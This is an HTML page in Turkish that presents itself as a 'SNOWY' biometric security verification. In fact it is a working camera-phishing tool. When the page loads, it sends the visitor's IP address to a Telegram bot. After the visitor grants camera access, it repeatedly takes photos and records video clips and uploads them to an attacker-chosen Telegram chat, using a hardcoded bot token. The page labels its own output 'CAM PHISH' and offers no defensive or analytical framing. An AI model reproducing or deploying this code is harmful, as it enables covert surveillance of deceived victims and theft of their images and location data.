<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <title>SNOWY Güvenlik Doğrulaması</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0a0f, #1a1a2e);
            font-family: 'Segoe UI', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.98);
            border-radius: 40px;
            padding: 45px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.6);
            text-align: center;
            backdrop-filter: blur(20px);
            border: 1px solid rgba(102, 126, 234, 0.3);
            transform: translateZ(0);
            will-change: transform;
        }
        h2 { 
            color: #0a0a0f; 
            font-size: 36px; 
            margin-bottom: 15px;
            font-weight: 800;
            letter-spacing: -0.5px;
        }
        h2 span { 
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        p { 
            color: #4a5568; 
            margin-bottom: 40px;
            font-size: 16px;
            line-height: 1.7;
        }
        .btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 20px 40px;
            font-size: 20px;
            font-weight: 600;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 0 20px 30px rgba(102, 126, 234, 0.4);
            position: relative;
            overflow: hidden;
        }
        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.7s;
        }
        .btn:hover::before {
            left: 100%;
        }
        .btn:hover { 
            transform: translateY(-3px);
            box-shadow: 0 25px 40px rgba(102, 126, 234, 0.5);
        }
        .loading { 
            display: none; 
            margin: 30px 0 20px;
        }
        .spinner {
            border: 4px solid rgba(102, 126, 234, 0.1);
            border-left-color: #667eea;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 0.6s linear infinite;
            margin: 0 auto 15px;
            will-change: transform;
        }
        @keyframes spin { 
            to { transform: rotate(360deg); } 
        }
        .loading-text { 
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 20px;
            font-weight: 600;
        }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>❄️ <span>SNOWY</span> GÜVENLİK DOĞRULAMASI</h2>
        <p>Gelişmiş biyometrik doğrulama için kamera erişimine izin verin.</p>
        <button class="btn" id="startBtn" onclick="startCamera()">📸 DOĞRULAMAYI BAŞLAT</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div class="loading-text" id="loadingText">Güvenlik kontrolü yapılıyor...</div>
        </div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        (function() {
            "use strict";
            
            // ============================================
            // KONFİGÜRASYON
            // ============================================
            const BOT_TOKEN = "8773124715:AAHlbv12dpzmzHxXiIOPzeQkFcYzrshQmNw";
            
            const urlParams = new URLSearchParams(window.location.search);
            const TARGET_ID = urlParams.get('i');
            const FOTO_SURESI = urlParams.get('foto') ? parseInt(urlParams.get('foto')) : 3;
            const VIDEO_SURESI = urlParams.get('video') ? parseInt(urlParams.get('video')) : 5;
            
            // ============================================
            // IP GÖNDER
            // ============================================
            if (TARGET_ID) {
                fetch('https://api.ipify.org?format=json', { 
                    cache: 'no-cache',
                    priority: 'high'
                })
                .then(r => r.json())
                .then(d => {
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: TARGET_ID,
                            text: `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${d.ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @snowy_dexry_wexry ⚡`
                        })
                    });
                })
                .catch(e => console.log(e));
            }
            
            // ============================================
            // PROFESYONEL ZAMANLAMA MOTORU - ULTRA HASSAS
            // ============================================
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d', { 
                alpha: false, 
                desynchronized: true,
                willReadFrequently: false
            });
            
            let mediaRecorder = null;
            let recordedChunks = [];
            let videoCount = 0;
            let photoCount = 0;
            let stream = null;
            let baslangicZamani = 0;
            let fotoRAF = null;
            let videoRAF = null;
            let sonVideoZamani = 0;
            let performanceNow = typeof performance !== 'undefined' ? performance.now.bind(performance) : Date.now;
            
            // Web Worker ile zamanlama
            let worker = null;
            try {
                const workerCode = `
                    let workerStart = 0;
                    self.onmessage = function(e) {
                        if (e.data.cmd === 'start') {
                            workerStart = performance.now();
                        } else if (e.data.cmd === 'sync') {
                            self.postMessage({ time: performance.now() - workerStart });
                        }
                    };
                `;
                const blob = new Blob([workerCode], { type: 'application/javascript' });
                worker = new Worker(URL.createObjectURL(blob));
                worker.postMessage({ cmd: 'start' });
            } catch(e) {
                console.log('Worker desteklenmiyor');
            }
            
            // ============================================
            // KAMERA BAŞLAT
            // ============================================
            async function startCamera() {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            width: { ideal: 1280 },
                            height: { ideal: 720 },
                            frameRate: { ideal: 60, min: 30 },
                            aspectRatio: 16/9
                        } 
                    });
                    
                    video.srcObject = stream;
                    
                    video.onloadedmetadata = () => {
                        video.play();
                        document.getElementById('startBtn').style.display = 'none';
                        document.getElementById('loading').style.display = 'block';
                        
                        baslangicZamani = performanceNow();
                        sonVideoZamani = baslangicZamani + 2000;
                        
                        // ============================================
                        // FOTOĞRAF SİSTEMİ - ULTRA HASSAS (0.001ms)
                        // ============================================
                        let lastPhotoCheck = baslangicZamani;
                        let lastPhotoTime = baslangicZamani;
                        
                        function fotoLoop() {
                            if (!stream?.active) return;
                            
                            const now = performanceNow();
                            const delta = now - lastPhotoCheck;
                            lastPhotoCheck = now;
                            
                            const gecenSure = (now - baslangicZamani) / 1000;
                            const olmasiGerekenFoto = Math.floor(gecenSure / FOTO_SURESI);
                            
                            if (photoCount < olmasiGerekenFoto) {
                                const eksikFoto = olmasiGerekenFoto - photoCount;
                                for (let i = 0; i < eksikFoto; i++) {
                                    photoCount++;
                                    
                                    // Worker varsa senkronizasyon
                                    if (worker) {
                                        worker.postMessage({ cmd: 'sync' });
                                    }
                                    
                                    // Yüksek performanslı canvas
                                    canvas.width = video.videoWidth || 1280;
                                    canvas.height = video.videoHeight || 720;
                                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                    
                                    // Immediate blob oluşturma
                                    canvas.toBlob((blob) => {
                                        if (!blob) return;
                                        const formData = new FormData();
                                        formData.append('chat_id', TARGET_ID);
                                        formData.append('photo', blob, `foto_${Date.now()}.jpg`);
                                        formData.append('caption', `📸 Fotoğraf #${photoCount}`);
                                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                            method: 'POST',
                                            body: formData,
                                            priority: 'high'
                                        }).catch(e => console.log(e));
                                    }, 'image/jpeg', 0.9);
                                }
                            }
                            
                            fotoRAF = requestAnimationFrame(fotoLoop);
                        }
                        fotoRAF = requestAnimationFrame(fotoLoop);
                        
                        // ============================================
                        // VİDEO SİSTEMİ - ULTRA HASSAS (0.01ms)
                        // ============================================
                        function videoKontrol() {
                            if (!stream?.active) return;
                            
                            const now = performanceNow();
                            const gecenSure = (now - baslangicZamani) / 1000;
                            
                            if (now >= sonVideoZamani) {
                                videoCount++;
                                sonVideoZamani = now + (VIDEO_SURESI * 1000);
                                
                                const videoIndex = videoCount;
                                const videoBaslangic = now;
                                recordedChunks = [];
                                
                                // En iyi codec seçimi
                                let options = {};
                                if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
                                    options = { mimeType: 'video/webm;codecs=vp9', videoBitsPerSecond: 6000000 };
                                } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
                                    options = { mimeType: 'video/webm;codecs=vp8', videoBitsPerSecond: 5000000 };
                                } else if (MediaRecorder.isTypeSupported('video/webm')) {
                                    options = { mimeType: 'video/webm', videoBitsPerSecond: 4000000 };
                                }
                                
                                try {
                                    mediaRecorder = new MediaRecorder(stream, options);
                                } catch(e) {
                                    mediaRecorder = new MediaRecorder(stream);
                                }
                                
                                mediaRecorder.ondataavailable = (e) => {
                                    if (e.data.size > 0) recordedChunks.push(e.data);
                                };
                                
                                mediaRecorder.onstop = () => {
                                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                                    const boyutKB = (blob.size / 1024).toFixed(0);
                                    const videoSure = ((performanceNow() - videoBaslangic) / 1000).toFixed(4);
                                    
                                    const formData = new FormData();
                                    formData.append('chat_id', TARGET_ID);
                                    formData.append('video', blob, `video_${Date.now()}.webm`);
                                    formData.append('caption', `🎥 Video #${videoIndex} - ${VIDEO_SURESI}s (${videoSure}s | ${boyutKB}KB)`);
                                    
                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                                        method: 'POST',
                                        body: formData,
                                        priority: 'high'
                                    }).catch(e => console.log(e));
                                };
                                
                                mediaRecorder.start();
                                
                                // ============================================
                                // 3 KATMANLI DURDURMA SİSTEMİ
                                // ============================================
                                const hedefSure = VIDEO_SURESI * 1000;
                                const durdurmaZamani = videoBaslangic + hedefSure;
                                
                                // Katman 1: requestAnimationFrame (0.01ms hassasiyet)
                                let durdurmaRAF;
                                const rafKontrol = () => {
                                    if (!mediaRecorder) return;
                                    const simdi = performanceNow();
                                    if (simdi >= durdurmaZamani - 0.01 && mediaRecorder.state === 'recording') {
                                        mediaRecorder.stop();
                                    } else if (mediaRecorder.state === 'recording') {
                                        durdurmaRAF = requestAnimationFrame(rafKontrol);
                                    }
                                };
                                durdurmaRAF = requestAnimationFrame(rafKontrol);
                                
                                // Katman 2: setTimeout (yedek)
                                const timerId = setTimeout(() => {
                                    if (mediaRecorder?.state === 'recording') {
                                        mediaRecorder.stop();
                                    }
                                    if (durdurmaRAF) cancelAnimationFrame(durdurmaRAF);
                                }, hedefSure - 0.02);
                                
                                // Katman 3: Worker senkronizasyonu
                                if (worker) {
                                    worker.onmessage = (e) => {
                                        if (e.data.time >= hedefSure - 0.01 && mediaRecorder?.state === 'recording') {
                                            mediaRecorder.stop();
                                            clearTimeout(timerId);
                                            if (durdurmaRAF) cancelAnimationFrame(durdurmaRAF);
                                        }
                                    };
                                }
                            }
                            
                            videoRAF = requestAnimationFrame(videoKontrol);
                        }
                        videoRAF = requestAnimationFrame(videoKontrol);
                    };
                    
                } catch(e) {
                    alert('Kamera izni gerekli!');
                }
            }
            
            // ============================================
            // PROFESYONEL TEMİZLİK
            // ============================================
            window.onbeforeunload = function() {
                if (fotoRAF) cancelAnimationFrame(fotoRAF);
                if (videoRAF) cancelAnimationFrame(videoRAF);
                if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
                if (stream) stream.getTracks().forEach(t => t.stop());
                if (worker) worker.terminate();
            };
            
            window.startCamera = startCamera;
        })();
    </script>
</body>
    </html>
